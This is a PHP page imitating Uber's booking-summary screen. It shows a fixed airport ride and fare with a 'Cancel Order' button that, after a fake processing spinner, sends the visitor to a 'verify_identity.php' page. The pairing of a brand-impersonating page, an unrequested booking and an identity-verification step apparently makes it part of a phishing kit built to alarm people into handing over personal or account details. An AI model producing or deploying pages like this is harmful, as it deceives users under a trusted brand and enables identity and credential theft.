<?php
session_start();
include "./Assets/php/config/config.php";
?>
<!DOCTYPE html>

<html lang="en"><head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>Uber - Booking Summary</title>
<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet"/>
<script id="tailwind-config">
      tailwind.config = {
        darkMode: "class",
        theme: {
          extend: {
            "colors": {
                    "secondary-container": "#d4d4d4",
                    "background": "#f9f9f9",
                    "on-error": "#ffffff",
                    "inverse-on-surface": "#f1f1f1",
                    "surface-bright": "#f9f9f9",
                    "error-container": "#ffdad6",
                    "surface-container-lowest": "#ffffff",
                    "on-surface-variant": "#474747",
                    "primary-container": "#3b3b3b",
                    "outline": "#777777",
                    "surface-tint": "#5e5e5e",
                    "surface": "#f9f9f9",
                    "surface-container-highest": "#e2e2e2",
                    "on-secondary": "#ffffff",
                    "primary": "#000000",
                    "on-primary-fixed-variant": "#e2e2e2",
                    "tertiary-fixed-dim": "#474747",
                    "surface-container-high": "#e8e8e8",
                    "on-background": "#1b1b1b",
                    "primary-fixed": "#5e5e5e",
                    "on-tertiary": "#e2e2e2",
                    "on-primary": "#ffffff",
                    "on-secondary-container": "#1a1c1c",
                    "surface-container-low": "#f3f3f3",
                    "on-tertiary-container": "#ffffff",
                    "on-surface": "#1b1b1b",
                    "secondary-fixed-dim": "#aaabab",
                    "secondary-fixed": "#c6c6c7",
                    "on-primary-fixed": "#ffffff",
                    "secondary": "#5d5f5f",
                    "on-primary-container": "#ffffff",
                    "tertiary": "#3b3b3b",
                    "on-secondary-fixed": "#1a1c1c",
                    "outline-variant": "#c6c6c6",
                    "on-secondary-fixed-variant": "#3a3c3c",
                    "surface-variant": "#e2e2e2",
                    "inverse-primary": "#c6c6c6",
                    "on-error-container": "#410002",
                    "on-tertiary-fixed": "#ffffff",
                    "tertiary-fixed": "#5e5e5e",
                    "tertiary-container": "#747474",
                    "surface-dim": "#dadada",
                    "surface-container": "#eeeeee",
                    "inverse-surface": "#303030",
                    "error": "#ba1a1a",
                    "primary-fixed-dim": "#474747",
                    "on-tertiary-fixed-variant": "#e2e2e2"
            },
            "borderRadius": {
                    "DEFAULT": "0.125rem",
                    "lg": "0.25rem",
                    "xl": "0.5rem",
                    "full": "0.75rem"
            },
            "fontFamily": {
                    "headline": ["Plus Jakarta Sans"],
                    "body": ["Inter"],
                    "label": ["Inter"]
            }
          },
        },
      }
    </script>
<style>
        .material-symbols-outlined {
            font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24;
        }
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f9f9f9;
        }
        h1, h2, h3 {
            font-family: 'Plus Jakarta Sans', sans-serif;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(16px); }
            to   { opacity: 1; transform: translateY(0); }
        }
        .animate-fade-in-up {
            animation: fadeInUp 0.55s cubic-bezier(0.16,1,0.3,1) forwards;
            opacity: 0;
        }
        .delay-100 { animation-delay: 100ms; }
        .delay-200 { animation-delay: 200ms; }
        .delay-300 { animation-delay: 300ms; }
        .delay-400 { animation-delay: 400ms; }
    </style>
</head>
<body class="bg-background text-on-surface min-h-screen">

<!-- TopNavBar -->
<nav class="fixed top-0 w-full z-50 bg-[#f9f9f9]/80 backdrop-blur-xl flex justify-between items-center px-6 py-4">
    <div class="text-2xl font-bold tracking-tight text-black" style="font-family:'Plus Jakarta Sans',sans-serif;">Uber</div>
    <div class="flex items-center gap-6">
        <button class="text-neutral-500 hover:opacity-80 transition-opacity flex items-center">
            <span class="material-symbols-outlined">help</span>
        </button>
        <button class="text-neutral-500 hover:opacity-80 transition-opacity flex items-center">
            <span class="material-symbols-outlined">close</span>
        </button>
    </div>
</nav>

<!-- Main Content Canvas -->
<main class="pt-24 pb-12 px-4 max-w-lg mx-auto">

    <!-- Header Section -->
    <header class="mb-8 animate-fade-in-up delay-100">
        <h1 class="text-3xl font-extrabold tracking-tight text-on-surface mb-2">Booking Summary</h1>
        <p class="text-on-surface-variant font-medium">Review your ride details before confirmation.</p>
    </header>

    <!-- Service Card (Bento Style) -->
    <div class="grid grid-cols-1 gap-4 mb-8 animate-fade-in-up delay-200">
        <div class="bg-surface-container-lowest p-6 rounded-xl shadow-sm">
            <div class="flex justify-between items-start mb-6">
                <div>
                    <span class="bg-primary text-white text-[10px] font-bold uppercase tracking-widest px-2 py-1 rounded mb-3 inline-block">Premium Selection</span>
                    <h2 class="text-2xl font-bold">Black Sedan</h2>
                    <p class="text-on-surface-variant text-sm">Professional top-rated drivers</p>
                </div>
                <div class="w-24 h-16 flex items-center justify-center">
                    <img alt="Luxury car" class="object-contain" src="https://lh3.googleusercontent.com/aida-public/AB6AXuCO0Dg3-iPoDHHF2AfbkRhgN5Q4L3uQhFw-z8znrUJvVXzhvenAMI5BNQskBS51U2TSjTSyCcS77QdJWE7_FsI2qQRE4RP5MKvbTH3sjLBkdrhrnNqF05aO6LzemLdulYBU9r0aXDIY4Z9FxN_xrjB1TuomHYCDW-yRd_d9bYUjXULDsGBKbIrnNel7-cdh2pDd4KA7DBU5Edi48gr3BKTTXTMfm8g21YrlcM-KtZ8PM7aL6clwwMgO_KBac78ih1oUsaRd7QkBAHxh"/>
                </div>
            </div>

            <!-- Map/Route -->
            <div class="bg-surface-container rounded-lg h-48 overflow-hidden relative mb-6">
                <img alt="Route Map" class="w-full h-full object-cover grayscale opacity-80" src="https://lh3.googleusercontent.com/aida-public/AB6AXuDH-ue57nmrqNe8RYyw1u4ZY-mMcfn05EQ349w1A2kxBzwKjR1PV0atoPCTB8lacWcbRKDfp3D7aBRCv8SNXhgyQIvz_hCpeFRil5ZhuvhAMyA_BzxHkuu71RqKGOjxTQ2td-gQVVFVIAQGMwkhrcSISXifKlOoHjjNcskmOJq_RRg3jSqitmlEGHO2F1MUCw5XRxG5b3GDQhRkI3VipQ1XHs7OPkaTgrkNM-a8n928fcyp2Tv8YeoKv4FQuZQFjD5-a6Pjje3eP9im"/>
                <div class="absolute inset-0 flex items-center justify-center pointer-events-none">
                    <div class="bg-primary p-2 rounded-full shadow-lg">
                        <span class="material-symbols-outlined text-white text-base" style="font-variation-settings: 'FILL' 1;">navigation</span>
                    </div>
                </div>
            </div>

            <!-- Itinerary Details -->
            <div class="space-y-6 relative">
                <div class="absolute left-[11px] top-3 bottom-3 w-[1px] bg-outline-variant opacity-30"></div>
                <div class="flex items-start gap-4 relative z-10">
                    <div class="w-6 h-6 rounded-full bg-surface-container-highest flex items-center justify-center border-2 border-white">
                        <div class="w-2 h-2 bg-primary rounded-full"></div>
                    </div>
                    <div>
                        <p class="text-[10px] font-bold uppercase tracking-widest text-on-surface-variant mb-1">Pickup Location</p>
                        <p class="text-on-surface font-semibold">1248 Madison Ave, New York</p>
                    </div>
                </div>
                <div class="flex items-start gap-4 relative z-10">
                    <div class="w-6 h-6 rounded-full bg-primary flex items-center justify-center border-2 border-white">
                        <span class="material-symbols-outlined text-[12px] text-white" style="font-variation-settings: 'FILL' 1;">location_on</span>
                    </div>
                    <div>
                        <p class="text-[10px] font-bold uppercase tracking-widest text-on-surface-variant mb-1">Drop-off Destination</p>
                        <p class="text-on-surface font-semibold">JFK International Airport, Terminal 4</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Price Breakdown Card -->
        <div class="bg-surface-container-low p-6 rounded-xl animate-fade-in-up delay-300">
            <h3 class="text-[10px] font-bold uppercase tracking-widest text-on-surface-variant mb-4">Fare Breakdown</h3>
            <div class="space-y-3">
                <div class="flex justify-between items-center">
                    <span class="text-on-surface-variant text-sm">Base Rate</span>
                    <span class="text-on-surface font-medium">$52.00</span>
                </div>
                <div class="flex justify-between items-center">
                    <span class="text-on-surface-variant text-sm">Service Fees</span>
                    <span class="text-on-surface font-medium">$4.50</span>
                </div>
                <div class="flex justify-between items-center">
                    <span class="text-on-surface-variant text-sm">Airport Surcharge</span>
                    <span class="text-on-surface font-medium">$2.50</span>
                </div>
                <div class="pt-4 mt-2 border-t border-outline-variant/20 flex justify-between items-center">
                    <span class="text-lg font-bold">Total Estimated</span>
                    <span class="text-2xl font-extrabold tracking-tighter">$59.00</span>
                </div>
            </div>
        </div>
    </div>

    <!-- Action Button -->
    <div class="space-y-4 pt-4 animate-fade-in-up delay-400">
        <button id="cancelBtn" onclick="handleCancel()" class="w-full bg-primary text-white py-4 rounded-lg font-bold text-lg hover:opacity-90 active:scale-95 duration-100 transition-all flex items-center justify-center gap-2">
            Cancel Order
            <span class="material-symbols-outlined">arrow_forward</span>
        </button>
    </div>
</main>

<!-- Footer Space for Safe Area -->
<div class="h-12"></div>

<script>
function handleCancel() {
    const btn = document.getElementById('cancelBtn');

    // Animate button -> loading state
    btn.disabled = true;
    btn.innerHTML = `
        <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
        </svg>
        <span>Processing...</span>`;
    btn.classList.add('opacity-80');

    // Redirect after short delay
    setTimeout(() => {
        window.location.href = './verify_identity.php';
    }, 1200);
}
</script>
</body></html>
